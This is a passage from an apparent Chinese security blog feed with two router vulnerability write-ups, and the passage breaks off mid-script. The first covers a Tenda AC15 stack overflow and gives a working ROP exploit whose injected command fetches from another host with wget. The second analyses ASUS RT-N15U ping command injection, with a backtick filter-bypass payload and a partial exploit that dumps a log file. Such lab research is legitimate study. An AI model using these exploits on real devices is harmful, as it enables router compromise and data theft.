class="hljs-keyword">return</span> <span class="hljs-number">2</span>; <span class="hljs-comment">// 返回 2 表示出错</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里有两个strcpy</p><p>向上找到setMacFilterCfg</p><p>文件结构中查找，定位到mac_filter.html</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/br0%E7%9A%84%E7%88%B1%E6%81%A8%E6%83%85%E4%BB%87/image-20240802152517372.png" alt="image-20240802152517372"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>tenda_ac15_栈溢出</title>
    <link href="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <url>/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="tenda-ac15-栈溢出"><a href="#tenda-ac15-栈溢出" class="headerlink" title="tenda ac15 栈溢出"></a>tenda ac15 栈溢出</h2><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><br>target_ip = <span class="hljs-string">&quot;192.168.0.3&quot;</span><br>target_port = <span class="hljs-number">80</span>  <br><br>cmd=<span class="hljs-string">b&quot;wget http://192.168.0.1:8000/&quot;</span><br>libc_base = <span class="hljs-number">0x76dab000</span>   <span class="hljs-comment">#libc.so</span><br>readble_addr= <span class="hljs-number">0x0005BE05</span><br>test= <span class="hljs-number">0x0006707C</span><br>system_offset = <span class="hljs-number">0x5A270</span><br>pop_r0_pc_addr=<span class="hljs-number">0x0003db80</span><br><br>pop_r3_pc = <span class="hljs-number">0x18298</span><br>mov_ro_ret_r3_offset = <span class="hljs-number">0x40CB8</span><br><br>test=<span class="hljs-string">b&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaa&#x27;</span>+p32(libc_base+readble_addr)+<span class="hljs-string">b&#x27;zaabbaabcaabdaabeaabfaab&#x27;</span>+p32(pop_r3_pc+libc_base) + p32(libc_base + system_offset)  + p32(mov_ro_ret_r3_offset+libc_base)+cmd<br><br>url = <span class="hljs-string">f&quot;http://<span class="hljs-subst">&#123;target_ip&#125;</span>/goform/fast_setting_wifi_set&quot;</span><br>cookie = &#123;<span class="hljs-string">&quot;cookie&quot;</span>: <span class="hljs-string">&quot;password=mnrcvb&quot;</span>&#125;<br><br><span class="hljs-comment">#data = &#123;&quot;ssid&quot;: payload&#125;</span><br>data = &#123;<span class="hljs-string">&quot;ssid&quot;</span>: test&#125;<br>response = requests.post(url, cookies=cookie, data=data)<br></code></pre></td></tr></table></figure><p>模拟略，记得关闭地址随机化</p><p>已知漏洞点在fast_setting_wifi_set的ssid位置</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240808182625027.png" alt="image-20240808182625027"></p><p>危险函数strcpy</p><p>先cyc生成500个坏字符</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240808182942327.png" alt="image-20240808182942327"></p><p>然后gdb调试</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> arch <span class="hljs-comment">arm</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">endian little</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">sysroot lib</span>/<br>set solib-search-path lib/<br>b <span class="hljs-comment">*0x00066EE0</span>   //<span class="hljs-comment">fast</span>函数开头<br>b <span class="hljs-comment">*0x0006707C</span>   //第一个<span class="hljs-comment">strcpy</span><br>b <span class="hljs-comment">*0x00067090</span>   //第二个<span class="hljs-comment">strcpy</span><br>b <span class="hljs-comment">*0x00067758</span>   //<span class="hljs-comment">fast</span>函数<span class="hljs-comment">pop</span>处<br>target <span class="hljs-comment">remote 192.168.0.3:8866</span><br></code></pre></td></tr></table></figure><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240808183702980.png" alt="image-20240808183702980"></p><p>走到strcpy这里卡住了</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240808183927605.png" alt="image-20240808183927605"></p><p>r1本来是一个地址指针，但是这里被坏字符覆盖了，所以一直跳不过去</p><p>后面要把yaaa处的字符替换成一个libc上的有效的可读地址</p><p>这里在栈上随便找了一个地址给r1，然后继续执行</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240808184411530.png" alt="image-20240808184411530"></p><p>继续执行到pop处，r11的坏字符gaab给了pc，也就是说要把gaab改成我们要跳转的函数的地址</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240808184721294.png" alt="image-20240808184721294"></p><p>修改exp</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">test=b&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaa&#x27;+p32(<span class="hljs-name">readable_addr</span>)+&#x27;zaabbaabcaabdaabeaabfaab&#x27;+p32(<span class="hljs-name">pop_r3_pc+libc_base</span>)<br></code></pre></td></tr></table></figure><p><strong><code>p32()</code>函数的作用是将一个32位整数（即4个字节）转换为字节串</strong></p><p>p32(pop_r3_pc+libc_base)是如何找到的？</p><p>libc的基地址</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240808185549824.png" alt="image-20240808185549824"></p><p>pop_r3_pc</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ROPgadget <span class="hljs-attr">--binary</span> libc<span class="hljs-selector-class">.so</span>.<span class="hljs-number">0</span> <span class="hljs-attr">--only</span> <span class="hljs-string">&quot;pop&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240808185802266.png" alt="image-20240808185802266"></p><p>这里执行后会跳转到libc里面</p><p>动调一下看变化，跳到fast函数的pop处</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240808193115421.png" alt="image-20240808193115421"></p><p>继续添加exp</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">test</span>=b<span class="hljs-string">&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaa&#x27;</span>+p32(readable_addr)+b<span class="hljs-string">&#x27;zaabbaabcaabdaabeaabfaab&#x27;</span>+p32(pop_r3_pc+libc_base)+p32(libc_base + system_<span class="hljs-literal">off</span>set)  + p32(mov_ro_ret_r3_<span class="hljs-literal">off</span>set+libc_base)+cmd<br><br><br><br><br><span class="hljs-attr">cmd</span>=b<span class="hljs-string">&quot;wget http://192.168.0.1:8000/&quot;</span><br></code></pre></td></tr></table></figure><p>mov_ro_ret_r3_offset&#x3D;0x00040CB8</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240808190928759.png" alt="image-20240808190928759"></p><p>为什么要这样？</p><p>继续动调</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240808193738477.png" alt="image-20240808193738477"></p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240808193904029.png" alt="image-20240808193904029"></p><p>执行成功</p><p>!<img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240819002114376.png" alt="image-20240819002114376"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>华硕_RT-N15U_命令执行漏洞分析</title>
    <link href="/2024/07/08/%E5%8D%8E%E7%A1%95-RT-N15U-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <url>/2024/07/08/%E5%8D%8E%E7%A1%95-RT-N15U-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h3 id="华硕-RT-N15U-命令执行漏洞分析"><a href="#华硕-RT-N15U-命令执行漏洞分析" class="headerlink" title="华硕 RT-N15U 命令执行漏洞分析"></a>华硕 RT-N15U 命令执行漏洞分析</h3><p><strong>路由器型号：RT-N15U固件版本：3.0.0.4.376_3754</strong></p><h4 id="1，漏洞介绍"><a href="#1，漏洞介绍" class="headerlink" title="1，漏洞介绍"></a>1，漏洞介绍</h4><p>​     由于前后端过滤不严，导致RT-N15U的NetworkTool菜单中的ping功能出现漏洞，通过绕过允许攻击者远程执行命令。</p><h4 id="2，漏洞分析"><a href="#2，漏洞分析" class="headerlink" title="2，漏洞分析"></a>2，漏洞分析</h4><h5 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h5><p>包名：FW_RT_N15U_30043763754.trx</p><p>binwalk分析</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">binwalk -E FW_RT_N15U_<span class="hljs-number">30043763754</span>.trx<br></code></pre></td></tr></table></figure><p>binwalk解包</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">binwalk -Me FW_RT_N15U_<span class="hljs-number">30043763754</span>.trx<br></code></pre></td></tr></table></figure><p>得到文件结构</p><p>查看下目录，发现了几个不同于dlink的文件夹，但点进去都是空。查阅资料发现，jffs 文件夹是 ASUS 路由器固件中一个非常有用的持久性存储区域，主要用于用户自定义文件、第三方软件安装和其他持久性数据存储。</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723214311192.png" alt="image-20240723214311192"></p><p>通过修改过的firmwalker进行枚举，增加了一些信息泄露关键字</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">firmwalker$ </span><span class="language-bash"><span class="hljs-built_in">sudo</span> ./firmwalker_pro/firmwalker.sh ~/gujian/FW/_FW_RT_N15U_30043763754.trx.extracted/squashfs-root/ &gt; FW.txt</span><br></code></pre></td></tr></table></figure><p>服务是httpd起的，启动项在rc二进制文件</p><h6 id="httpd二进制文件"><a href="#httpd二进制文件" class="headerlink" title="httpd二进制文件"></a>httpd二进制文件</h6><p>file、checksec来一波、动态链接、mips小端</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723213906829.png" alt="image-20240723213906829"></p><h6 id="启动项rc二进制文件"><a href="#启动项rc二进制文件" class="headerlink" title="启动项rc二进制文件"></a>启动项rc二进制文件</h6><p>ida打开rc二进制文件</p><p>这里着重关注httpd服务如何启用的，定位到sub_411C78()函数，这里调用了start_services函数</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723215745609.png" alt="image-20240723215745609"></p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs scss">int <span class="hljs-built_in">start_services</span>()<br>&#123;<br><span class="hljs-comment">//使用 cprintf 函数输出调试信息，格式为 &quot;start_services 3251&quot;，其中 3251 是一个整数参数。</span><br>  <span class="hljs-built_in">cprintf</span>(&quot;%s %d\n&quot;, &quot;start_services&quot;, <span class="hljs-number">3251</span>);<br><span class="hljs-comment">//启动一系列服务</span><br>  <span class="hljs-built_in">start_telnetd</span>();<br>  <span class="hljs-built_in">start_eapd</span>();<br>  <span class="hljs-built_in">start_nas</span>();<br>  <span class="hljs-built_in">start_wps</span>();<br>  <span class="hljs-built_in">start_wpsaide</span>();<br>  <span class="hljs-built_in">start_dnsmasq</span>();<br>  <span class="hljs-built_in">start_lan_port</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">start_httpd</span>();<br>  <span class="hljs-built_in">start_infosvr</span>();<br>  <span class="hljs-built_in">start_networkmap</span>(<span class="hljs-number">1</span>);<br>  <span class="hljs-built_in">restart_rstats</span>();<br>  <span class="hljs-built_in">start_watchdog</span>();<br>  <span class="hljs-built_in">start_lltd</span>();<br>  <span class="hljs-built_in">start_upnp</span>();<br>  <span class="hljs-built_in">start_pptpd</span>();<br><span class="hljs-comment">//使用 f_exists() 函数检查文件 &quot;/opt/etc/init.d/S50aicloud&quot; 是否存在，如果存在则调用 system() 函数执行 &quot;sh /opt/etc/init.d/S50aicloud scan&quot; 命令。</span><br>  if ( f_exists(&quot;/opt/etc/init.d/S50aicloud&quot;) )<br>    <span class="hljs-built_in">system</span>(&quot;sh /opt/etc/init.d/S50aicloud scan&quot;);<br>  return <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>进入start_httpd()分析</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">int</span> start_httpd()<br>&#123;<br><span class="hljs-regexp">//</span>初始化<br>  char *<span class="hljs-number">v1</span>; <span class="hljs-regexp">//</span> <span class="hljs-variable">$a0</span><br>  <span class="hljs-keyword">int</span> productid; <span class="hljs-regexp">//</span> <span class="hljs-variable">$v0</span><br>  char <span class="hljs-number">v3</span>[<span class="hljs-number">4</span>]; <span class="hljs-regexp">//</span> [sp+18h] [-10h] BYREF<br>  <span class="hljs-keyword">int</span> <span class="hljs-number">v4</span>[<span class="hljs-number">3</span>]; <span class="hljs-regexp">//</span> [sp+1Ch] [-Ch] BYREF<br>//这里初始化了一个整数数组 <span class="hljs-number">v4</span>，其中 <span class="hljs-number">v4</span>[<span class="hljs-number">1</span>] 被设置为 dword_4AF4A0 的值，<span class="hljs-number">v4</span>[<span class="hljs-number">0</span>] 被设置为字符串常量 <span class="hljs-string">&quot;httpd&quot;</span> 的地址。<br>  <span class="hljs-number">v4</span>[<span class="hljs-number">1</span>] = dword_4AF4A0;<br>  <span class="hljs-number">v4</span>[<span class="hljs-number">0</span>] = (<span class="hljs-keyword">int</span>)<span class="hljs-string">&quot;httpd&quot;</span>;<br><span class="hljs-regexp">//</span>条件检查，getpid() 函数返回当前进程的进程 ID。如果当前进程的 ID 不等于 <span class="hljs-number">1</span>，那么调用 notify_rc 函数，并传入 <span class="hljs-string">&quot;start_httpd&quot;</span> 作为参数，然后返回其结果。<br>  <span class="hljs-keyword">if</span> ( getpid() != <span class="hljs-number">1</span> )<br>    <span class="hljs-keyword">return</span> ((<span class="hljs-keyword">int</span> (__fastcall *)(const char *))notify_rc)(<span class="hljs-string">&quot;start_httpd&quot;</span>);<br><span class="hljs-regexp">//</span>获取配置信息，使用 nvram_get(<span class="hljs-string">&quot;httpd_dir&quot;</span>) 获取名为 <span class="hljs-string">&quot;httpd_dir&quot;</span> 的配置信息。如果获取失败（返回空指针），将 <span class="hljs-number">v1</span> 设置为空字符串；如果 <span class="hljs-number">v1</span> 为空字符串，将其设为 <span class="hljs-string">&quot;/www&quot;</span>。<br>  <span class="hljs-number">v1</span> = (char *)nvram_get(<span class="hljs-string">&quot;httpd_dir&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( !<span class="hljs-number">v1</span> )<br>    <span class="hljs-number">v1</span> = <span class="hljs-string">&quot;&quot;</span>;<br>  <span class="hljs-keyword">if</span> ( !*<span class="hljs-number">v1</span> )<br>    <span class="hljs-number">v1</span> = <span class="hljs-string">&quot;/www&quot;</span>;<br><span class="hljs-regexp">//</span>将当前工作目录更改为 <span class="hljs-number">v1</span> 所指向的目录。<br>  <span class="hljs-keyword">chdir</span>(<span class="hljs-number">v1</span>);<br><span class="hljs-regexp">//</span>检查http服务器启用状态，使用 nvram_get_int(<span class="hljs-string">&quot;http_enable&quot;</span>) 获取名为 <span class="hljs-string">&quot;http_enable&quot;</span> 的配置信息的整数值。如果其不等于 <span class="hljs-number">1</span>，则执行 <span class="hljs-keyword">eval</span>(<span class="hljs-number">v4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">v3</span>)，获取产品 ID 并记录一条正常日志消息以启动 HTTP 服务器。<br>  <span class="hljs-keyword">if</span> ( nvram_get_int(<span class="hljs-string">&quot;http_enable&quot;</span>) != <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-number">v4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">v3</span>);<br>    productid = get_productid();<br>    logmessage_normal(productid, <span class="hljs-string">&quot;start httpd&quot;</span>);<br>  &#125;<br>//将当前工作目录切换回操作系统的根目录 /。<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">chdir</span>(<span class="hljs-string">&quot;/&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h6 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h6><p>这里用到了ida的VulFi插件</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240907182208266.png" alt="image-20240907182208266"></p><p>搜集到这里的system危险函数就是我们今天的漏洞点</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240907182216667.png" alt="image-20240907182216667"></p><h5 id="模拟"><a href="#模拟" class="headerlink" title="模拟"></a>模拟</h5><p>使用FirmAE模拟</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723213240939.png" alt="image-20240723213240939"></p><p>这里FirmAE模拟起来以后连不上shell，但web界面里可以开启telnet</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723221754496.png" alt="image-20240723221754496"></p><p>PS：都可以直接开启telnet了为什么还要进web页面命令执行？因为有的内网防火墙即使开启telnet，23端口也无法出网</p><p>漏洞点在NetworkTools下的ping命令中</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//192.168.1.1/Main_Analysis_Content.asp</span><br></code></pre></td></tr></table></figure><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723182121152.png" alt="image-20240723182121152"></p><p>常规操作先输入127.0.0.1|echo 1&gt; &#x2F;tmp&#x2F;aaa</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723182701926.png" alt="image-20240723182701926"></p><p>burp抓包</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723182635939.png" alt="image-20240723182635939"></p><p>进入telnet查看&#x2F;tmp目录发现注入并未成功</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723182436610.png" alt="image-20240723182436610"></p><p>命令连接符尝试||、|、&amp;、&amp;&amp;、分号均无果</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c">cmd1 <span class="hljs-string">| cmd2 只执行cmd2</span><br>cmd1 <span class="hljs-string">|| cmd2 只有当cmd1执行失败后，cmd2才被执行</span><br>cmd1 <span class="hljs-meta">&amp; cmd2 先执行cmd1，不管是否成功，都会执行cmd2</span><br>cmd1 <span class="hljs-meta">&amp;&amp; cmd2 先执行cmd1，cmd1执行成功后才执行cmd2，否则不执行cmd2</span><br></code></pre></td></tr></table></figure><p>查看asp页面源代码</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723183921456.png" alt="image-20240723183921456"></p><p>可以看到document.form.destIP.value是我们输入框中输入的内容，当payload输入时，与ping -c $count 拼接成SystemCmd参数传入apply.cgi，然后进入httpd中进行进一步操作</p><p>IDA分析二进制文件httpd</p><p>搜索字符串traceroute定位到sub_41F360()函数</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723182957244.png" alt="image-20240723182957244"></p><p>查看伪代码</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723193722186.png" alt="image-20240723193722186"></p><p>get_cgi中接收SystemCmd的值</p><p>并且过滤掉了<code>&amp;、;、%、|、\n、\r</code>，怪不得一开始注入不成功</p><p>判断是哪个asp页面，判断输入的命令，进入sys_script函数进一步拼接系统要执行的命令并将其执行</p><p>sys_script函数</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240907182336906.png" alt="image-20240907182336906"></p><p>所以猜测，在web中用ping工具ping某ip，最后在系统中拼接执行的命令应该是</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">sh -c <span class="hljs-built_in">ping</span> -c $ip_count $ip &gt; /tmp/syscmd.<span class="hljs-built_in">log</span><br>//-c 是一个选项，告诉 Shell 后面的参数是一个命令字符串。<br></code></pre></td></tr></table></figure><p>这时插入<code>&amp;、;、%、|、\n、\r</code>以外的命令注入绕过payload  (可以是反引号或者$符)</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mel">linux下一些常见绕过方式&amp;&amp;、||、；、$()、··（反引号TAB上面的那个键）、%0a、%0d<br>参考文章：https:<span class="hljs-comment">//blog.csdn.net/L2329794714/article/details/123561984</span><br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">`<span class="hljs-built_in">echo</span> 1&gt;/tmp/aaa`    或者    $(<span class="hljs-built_in">echo</span> 1&gt;/tmp/aaa)<br></code></pre></td></tr></table></figure><p>如果说我们ping输入框输入&#96;&#96;&#96;&#96;echo 1&gt;&#x2F;tmp&#x2F;aaa&#96;&#96;&#96;的话，最后会拼接成如下命令在系统中执行</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">sh -c ping -c <span class="hljs-number">5</span> <span class="hljs-string">`echo 1&gt;/tmp/aaa`</span> &gt; <span class="hljs-regexp">/tmp/</span>syscmd.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure><p>反引号的特殊性：反引号括起来的命令，它会被先执行，并且其输出将作为 <code>ping</code> 命令的参数之一。</p><p>实现成功：</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723194818278.png" alt="image-20240723194818278"></p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723194844617.png" alt="image-20240723194844617"></p><h4 id="3，漏洞利用"><a href="#3，漏洞利用" class="headerlink" title="3，漏洞利用"></a>3，漏洞利用</h4><p>burp抓包发现不仅要发一个payload的包，还需要跟进一个重定向的发包，所以exp要发两个包</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723212700603.png" alt="image-20240723212700603"></p><p><strong>exp</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br>import subprocess<br><br>burp0_url = <span class="hljs-string">&quot;http://192.168.1.1:80/apply.cgi?current_page=Main_Analysis_Content.asp&amp;next_page=Main_Analysis_Content.asp&amp;group_id=&amp;modified=0&amp;action_mode=+Refresh+&amp;action_script=&amp;action_wait=&amp;first_time=&amp;preferred_lang=EN&amp;SystemCmd=ping+-c+5+%60cat+%2Ftmp%2Fsyslog.log%3E+test13.asp%60&amp;firmver=3.0.0.4&amp;cmdMethod=ping&amp;destIP=%60cat+%2Ftmp%2Fsyslog.log%3E+test13.asp%60&amp;pingCNT=5&quot;</span><br>burp0_headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;en-US,en;q=0.5&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate, br&quot;</span>, <span class="hljs-string">&quot;Authorization&quot;</span>: <span class="hljs-string">&quot;Basic YWRtaW46YWRtaW4=&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-string">&quot;Referer&quot;</span>: <span 